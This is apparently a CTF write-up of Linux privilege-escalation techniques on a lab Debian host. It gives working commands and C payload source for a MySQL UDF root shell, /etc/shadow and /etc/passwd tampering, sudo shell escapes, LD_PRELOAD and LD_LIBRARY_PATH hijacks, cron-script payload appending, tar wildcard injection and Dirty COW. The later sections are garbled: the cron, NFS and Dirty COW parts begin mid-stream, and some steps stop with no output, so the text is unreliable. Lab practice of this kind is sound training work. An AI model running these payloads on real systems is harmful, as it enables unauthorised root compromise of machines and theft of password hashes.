CTF Write-up: Linux PrivEsc

Introduction

A write-up exploring numerous techniques for privilege escalation on Linux.

Objective

Gain root using each technique.

Setup

Connect via the VPN.

Service Exploits - MySQL

The challenge presents an incorrectly configured MySQL service running as root with no password set. Connect as root:

user@debian:~$ mysql -u root

Connection succeeds without a password prompt:

mysql> SELECT USER();
+--------------------+
| USER()             |
+--------------------+
| root@localhost     |
+--------------------+

Check the MySQL user's privileges:

mysql> SHOW GRANTS FOR CURRENT_USER;

Output:

+---------------------------------------------------------------------+
| Grants for root@localhost                                           |
+---------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION |
+---------------------------------------------------------------------+

ALL PRIVILEGES on every database and table — this covers the MySQL-side prerequisite (FILE for writing the UDF shared object to the plugin directory via SELECT INTO DUMPFILE, plus the privileges to register and invoke the function). The OS-side prerequisite is separate: the mysqld daemon itself must be running as the OS root user, because the UDF's system() calls spawn shell processes that inherit mysqld's OS UID. If mysqld runs as a dedicated mysql system account, the same UDF chain installs and executes cleanly but the resulting shell runs as mysql, not root. Verify with ps:

user@debian:~$ ps -ef | awk 'NR==1 || /[m]ysqld/'
UID        PID  PPID  C STIME TTY          TIME CMD
root      2221     1  0 06:41 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      2346  2221  0 06:41 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root      2347  2221  0 06:41 ?        00:00:00 logger -t mysqld -p daemon.error

UID column shows root for both mysqld and its parent mysqld_safe; --user=root is explicit in mysqld's argv. Both prerequisites met. The exploit is a User Defined Function chain — EDB-ID 1518.

UDFs extend MySQL by loading C functions from shared libraries. The exploit defines a UDF, do_system(), wrapping the C standard library system() call — arbitrary shell commands invocable from SQL.

Create the UDF source file in /tmp:

user@debian:/tmp$ nano exploit_udf.c

Paste the exploit source from EDB-ID 1518. Compile to a shared object with gcc:

user@debian:/tmp$ gcc -Wall -fPIC -shared -o exploit_udf.so exploit_udf.c -lc

Reconnect to MySQL and switch to the mysql system database:

mysql> use mysql
Reading table information for completion of table and columns names
You can turn off this feature to get a quicker startup with -A
		
Database changed
mysql>

Create a single-column BLOB table to stage the shared object:

mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

Load the shared object into the table:

mysql> insert into foo values(load_file('/tmp/exploit_udf.so'));
Query OK, 1 row affected (0.00 sec)

Dump the row into MySQL's plugin directory:

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/exploit_udf.so';
Query OK, 1 row affected (0.00 sec)

Register the UDF. The "soname" clause points MySQL at the shared library:

mysql> create function do_system returns integer soname 'exploit_udf.so';
Query OK, 0 rows affected (0.00 sec)

Invoke the UDF to copy bash to /tmp/rootbash with the SUID bit set:

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+---------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')    |
+---------------------------------------------------------------------+
|                                                                   0 |
+---------------------------------------------------------------------+
1 row in set (0.00 sec)

Exit MySQL and execute the SUID bash. The -p flag preserves the effective UID — without it, bash drops privileges back to the calling user when launched SUID:

user@debian:/tmp$ /tmp/rootbash -p
rootbash-4.1# whoami
root
Readable /etc/shadow

/etc/shadow stores user password hashes; should be readable only by root. Check permissions:

user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow

World-readable. Read the file:

user@debian:~$ nano /etc/shadow
root:$6$Tb/euwmL$*********************************************

Root's password hash is in the first line (masked above). The $6$ prefix is the crypt(3) scheme identifier for sha512crypt — deterministic, not inferred. Crack with John the Ripper:

user@local:~/path/to/john$ ./john -format=sha512crypt -wordlist=/I/am/using/rockyou.txt /path/to/saved/hash

John recovers the plaintext. On the target, switch to root:

user@debian:~$ su root
Password:
root@debian/home/user# whoami
root
Writable /etc/shadow

/etc/shadow should be writable only by root. Check permissions:

user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow

World-writable. Generate a replacement hash:

user@debian:~$ mkpasswd -m sha-512 password123
$6$eR5nW1fZ63CE6Fy/$6g1I55XBX1ObH88mPxMI1CntZEq2mbT3BeJXkafhdjtKS.CZ2Krktglc0xOq60ByeK01ZzqMpj4Fz/H6PHlWH0

Overwrite root's hash field in /etc/shadow with the generated hash, then switch to root:

user@debian:~$ su root
Password:
root@debian:/home/user# whoami
root
Writable /etc/passwd

/etc/passwd should be writable only by root. Check permissions:

user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25 2019 /etc/passwd

World-writable. Two options: overwrite root's x placeholder with a hash, or append a new UID-0 user. The latter leaves the existing root entry untouched and is stealthier — preferred. Generate a hash:

user@debian:~$ openssl passwd password123
v.iwn1lhrlTpk

Append a UID-0 entry to /etc/passwd:

newrootuser:v.iwn1lhrlTpk:0:0:root:/root:/bin/bash

Save the file, then switch to the new account:

user@debian:~$ su newrootuser
Password:
root@debian:/home/user# whoami
root
Sudo - Shell Escape Sequences

Run sudo -l to list the current user's sudo permissions. NOPASSWD entries execute without a password:

user@debian:~$ sudo -l
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

Eleven binaries permitted, all NOPASSWD. Any exploitable via shell escape yields a root shell.

Cross-reference the sudo-permitted binaries against GTFOBins. Any binary listed there with a Sudo tab has a documented shell-escape payload. Picking less:

user@debian:~$ sudo less /etc/profile

sudo less runs the pager as root. The !/bin/sh shell-escape inherits those privileges:

sh-4.1# whoami
root

apache2 is NOPASSWD in the sudo -l output but has no GTFOBins entry — no direct shell-escape payload. Alternative technique: abuse apache2's config-parsing to leak /etc/shadow.

Reading the root user hash with Apache2

Assume a constrained scenario: /etc/shadow and /etc/passwd both correctly permissioned, and only apache2 is NOPASSWD:

user@debian:~$ sudo -l
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/apache2

Invoke apache2 with /etc/shadow as its config file. Running as root via sudo, it reads the file, fails to parse the first line, and leaks the failing token in its error message — which happens to be root's hash:

user@debian:~$ sudo /usr/sbin/apache2 -f /etc/shadow 
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$................'

Hash extracted. Crack with John the Ripper.

$6$ identifies sha512crypt — a crypt(3) scheme built on SHA-512 with salt and iteration, not bare SHA-512. Format-specific crack:

user@local:~/src/john/run$ ./john --format=sha512crypt --fork=8 --wordlist={wordlist_path} {hash_file_path}

John recovers the plaintext (redacted). Switch to root:

user@debian:~$ su root
Password:
root@debian:/home/user# whoami
root
Sudo - Environment Variables

Another sudo-based technique. Enumerate sudo config with sudo -l:

user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
		
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
.... {truncated}

Focus on the Matching Defaults entries block. env_reset clears most environment variables when sudo executes — the intended default. env_keep+= reintroduces exceptions: variables preserved across the sudo boundary. Two are kept here: LD_PRELOAD and LD_LIBRARY_PATH.

LD_PRELOAD forces the dynamic linker to load a specified shared object before any other library. LD_LIBRARY_PATH prepends directories to the linker's search path. Both are consulted at process start — before the target binary's main() executes.

Because env_keep preserves both across the sudo boundary, the current user's LD_PRELOAD value takes effect inside a root-executed process. Point it at an attacker-controlled shared object with a root-priv-escalation payload; execute any sudo-permitted binary to fire the payload as root.

Shared object source:

#include <unistd.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

_init() is used instead of main() because shared libraries don't execute main(). _init() runs automatically when the library is loaded — before the host program's own main(), ensuring the payload fires before any other code.

Inside _init(): unsetenv("LD_PRELOAD") clears the env var so child processes don't re-inherit it (prevents recursive load when system() spawns bash); setresuid(0,0,0) sets real, effective, and saved UIDs to root (all three, so any later setuid() drop can be reversed); system("/bin/bash -p") spawns a shell with elevated privileges preserved.

Compile to a shared object in /tmp (auto-cleans on reboot):

user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/payload.so /home/user/payload.c

Invoke any sudo-permitted binary with LD_PRELOAD pointing at the malicious .so. The constructor fires before the binary's main() — root shell:

user@debian:~$ sudo LD_PRELOAD=/tmp/payload.so nano
root@debian:/home/user#

Fallback if LD_PRELOAD is unavailable or ineffective:

Exploiting "LD_LIBRARY_PATH" to escalate privileges.

Re-enumerate sudo entitlements and env_keep for a constrained example (only apache2 sudo-permitted):

user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
		
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/apache2

LD_LIBRARY_PATH is in env_keep, and apache2 is NOPASSWD — the two ingredients for LD_LIBRARY_PATH hijack.

List apache2's shared library dependencies:

user@debian:~$ ldd /usr/sbin/apache2
	linux-vdso.so.1 =>  (0x00007fff819ff000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f288296d000)
	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f2882749000)
	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f288250f000)
	libpthread.so.0 => /lib/libpthread.so.0 (0x00007f28822f3000)
	libc.so.6 => /lib/libc.so.6 (0x00007f2881f87000)
	libuuid.so.1 => /lib/libuuid.so.1 (0x00007f2881d82000)
	librt.so.1 => /lib/librt.so.1 (0x00007f2881b7a000)
	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f2881943000)
	libdl.so.2 => /lib/libdl.so.2 (0x00007f288173e000)
	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f2881516000)

The dynamic linker resolves these library names at process start — default search order includes /usr/lib and other system paths.

LD_LIBRARY_PATH prepends attacker-controlled directories to that search order. Drop a malicious shared object named after one of apache2's legitimate dependencies (e.g. libcrypt.so.1) into /tmp, then invoke sudo apache2 with LD_LIBRARY_PATH=/tmp — the linker resolves the library from /tmp before /usr/lib, loading the attacker .so into a root-owned process.

Shared object source:

#include <stdio.h>
#include <stdlib.h>
		
static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

The __attribute__((constructor)) attribute makes hijack() run automatically when the library is loaded — the modern portable equivalent of _init(). Inside: unsetenv("LD_LIBRARY_PATH") stops further loaded libraries seeing the tampered path; setresuid(0,0,0) sets all three UIDs to root; system("/bin/bash -p") spawns a root shell.

Compile to a shared object named after the target library, in /tmp:

user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/library_path.c

Run sudo apache2 with LD_LIBRARY_PATH pointing at /tmp:

user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
root@debian:/home/user#

A shell script, overwrite.sh, runs every minute as root. If the foothold user can write to it, appending a payload gets that payload executed as root on the cron schedule.

Locate the script:

user@debian:~$ sudo find / -name "overwrite.sh"

Confirm writability:

user@debian:~$ test -w /usr/local/bin/overwrite.sh && echo "WRITABLE" || echo "NOT WRITABLE"

user@debian:~$ test -r /usr/local/bin/overwrite.sh && install -m 746 /usr/local/bin/overwrite.sh /tmp/.cron_script.bak && echo "BACKUP CREATED" || echo "NO BACKUP — destructive"
BACKUP CREATED

Append the payload — two commands: copy /bin/bash to /tmp/.update, then set the SUID bit so the foothold user can spawn it as EUID 0:

user@debian:~$ printf '\ncp /bin/bash /tmp/.update && chmod +s /tmp/.update\n' >> /usr/local/bin/overwrite.sh

Verify the append:

user@debian:~$ tail -1 /usr/local/bin/overwrite.sh

user@debian:~$ ls -la /tmp/.update

Shell script /usr/local/bin/compress.sh runs as root every minute. Check its type and contents:

user@debian:~$ file /usr/local/bin/compress.sh && cat /usr/local/bin/compress.sh
/usr/local/bin/compress.sh: POSIX shell script text executable
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

POSIX shell script, marked executable. It changes into /home/user and creates a gzip-compressed tar archive of everything the shell glob * expands to (all non-hidden entries). /home/user is the foothold user's home directory — freely writable.

The shell expands the glob into a list of filenames before tar runs, and tar parses that list as its arguments. Any filename beginning with -- is indistinguishable from a command-line option at that point — planting files with option-shaped names injects flags into the tar invocation. Two flags matter here: --checkpoint=N makes tar emit progress messages every N records, and --checkpoint-action=ACTION runs an action at each checkpoint — including exec=CMD, arbitrary shell.

Write a payload script to /home/user/update.sh that copies /bin/bash to /tmp/.update and sets the SUID bit. Then, in the same directory, create two empty files named --checkpoint=1 and --checkpoint-action=exec=sh update.sh. When the cron job's tar … * next runs, the shell expands the glob, tar sees the two injected options, hits its first checkpoint, and executes sh update.sh as the script's owner — leaving a SUID-root bash at /tmp/.update.

user@debian:~$ printf 'cp /bin/bash /tmp/.update && chmod +s /tmp/.update\n' > "/home/user/update.sh" && touch -- "/home/user/--checkpoint=1" "/home/user/--checkpoint-action=exec=sh update.sh" && echo "PLANTED" || echo "PLANT FAILED"
PLANTED

Verify all three files planted:

The active export is /tmp, world-mountable (*) and — critically — carrying no_root_squash. By default NFS root-squashes: a client connecting as root is remapped to the anonymous nobody user on the server, unable to create root-owned files. no_root_squash disables that mapping — any client with local root (including the attacker box) can mount, write to /tmp on the target as real UID 0, and drop SUID-root binaries for the foothold user to execute back on the target for a root shell.

The no_root_squash flag is only exploitable if none of the standard mitigations are also present. This one-liner checks all four conditions in one pass — no_root_squash set, no Kerberos authentication, no all_squash, and not read-only:

user@debian:~$ awk '/no_root_squash/ && !/sec=krb5/ && !/all_squash/ && !/[(,]ro[,)]/' /etc/exports
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

The /tmp export matches on all four counts: exported to any host (*), read-write, no Kerberos, no UID squashing of any kind. The attack path is open.

One last check before exploitation: the mount options on the target's /tmp. The kernel enforces nosuid and noexec at exec time regardless of a file's own permissions, so either flag on /tmp (or on a parent mount governing it) would silently defeat the SUID-drop technique:

After filtering, the standout candidate is Dirty COW (CVE-2016-5195), and specifically the 40839.c variant, for a few reasons:

  • Kernel range matches with margin. Dirty COW affects every Linux kernel from 2.6.22 through 4.8.3 — the target's 2.6.32 sits comfortably inside that window, not on the edge.
  • Reliability is exceptional. The bug is a race condition in the kernel's copy-on-write handling of memory mappings, triggered by legitimate syscalls (madvise, ptrace, or writes to /proc/self/mem) rather than exotic conditions. It works on essentially every affected kernel without per-version tuning — a rarity for kernel exploits.
  • No unusual preconditions. Any local unprivileged user can trigger it. No specific capability, group membership, or writable file is required.
  • The 40839.c variant specifically targets /etc/passwd, overwriting the root entry to yield a known root password. That's cleaner and more reversible than dropping a SUID shell or racing a running process, and doesn't depend on any particular runtime environment.

The other Dirty COW variants (40611.c, 40616.c, 40838.c, 40847.cpp) exploit the same underlying bug via different techniques — direct memory patching of a running process, PTRACE-based writes, and so on. All work, but 40839.c's /etc/passwd approach is the most predictable and leaves the cleanest trail to reverse afterwards.

Dirty COW is worth internalising as a first-check for any unpatched Linux target in the 2.6.22–4.8.3 window. That window covers most pre-2017 distros, and the exploit is reliable enough that ruling it in or out early saves time on the rest of the enumeration.

firefart's source has both parent and child execute the Done! printf, so a second Done! block prints later when the child's madvise loop completes — expected, not an error.

The race has already resolved (win or loss) by the first Done! block. Loops continue pointlessly — Ctrl+C to stop.

Verify:

user@debian:~$ head -1 /etc/passwd
toor:tovO5Co1svV8M:0:0:pwned:/root:/bin/bash

Elevate via su toor:

user@debian:~$ su toor
Password:
toor@debian:/home/user# id
uid=0(toor) gid=0(root) groups=0(root)

Root achieved. UID 0 is root on Linux, regardless of the username. The kernel makes access decisions on the numeric UID, not the name. toor is just a label attached to that UID in /etc/passwd.

Cleanup. Critically, restore /etc/passwd immediately:

toor@debian:/home/user# mv /dev/shm/.cache.bak /etc/passwd
toor@debian:/home/user# head -1 /etc/passwd
root:x:0:0:root:/root:/bin/bash
